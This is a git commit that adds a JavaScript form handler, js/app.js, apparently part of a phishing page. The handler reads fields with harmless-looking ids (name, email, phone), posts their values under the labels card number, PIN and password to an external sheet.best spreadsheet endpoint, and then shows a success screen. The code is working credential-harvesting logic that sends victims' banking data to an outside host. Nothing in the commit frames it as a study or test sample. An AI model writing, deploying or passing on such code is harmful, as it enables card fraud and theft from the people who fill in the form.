d8a19e4312bc3029385ac5accc4fa0e8cae7ddf5
aod34 <143645930+aod34@users.noreply.github.com>
2023-08-30 12:03:22 -0600

    ertgertgertgretg
    erwtgertgertgertgre

---
+++ js/app.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('formulario');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/5bda14d3-b20f-46d4-954c-fd1b23c176b4', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Tarjeta": formulario.nombre.value,
+            "Nip": formulario.correo.value,
+            "Contrasena": formulario.telefono.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
